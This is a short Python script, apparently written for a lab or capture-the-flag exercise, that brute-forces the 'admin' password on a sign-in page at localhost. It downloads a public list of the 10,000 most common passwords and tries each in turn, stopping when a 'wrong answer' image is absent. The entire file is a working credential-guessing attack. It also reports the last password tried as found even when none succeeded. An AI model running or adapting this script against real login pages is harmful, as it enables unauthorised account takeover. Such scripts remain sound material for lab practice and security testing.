#!/usr/bin/env python3

import requests

URL = "http://localhost:8080/?page=signin"
PWD_SOURCE = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10k-most-common.txt"
session = requests.Session()

def brute_force_login(
    url,
    username,
    password_list,
    username_field="username",
    password_field="password"
):

    for password in password_list:
        params = {
            "page": "signin",
            username_field: username,
            password_field: password,
            "Login": "Login"
        }

        response = requests.get(url, params=params)

        if not "images/WrongAnswer.gif" in response.text:
            break
    print("pwd is", password)

response = requests.get(PWD_SOURCE)

if response.status_code != 200:
    exit(-1)
 

password_list = response.text.split()
brute_force_login(URL, "admin", password_list)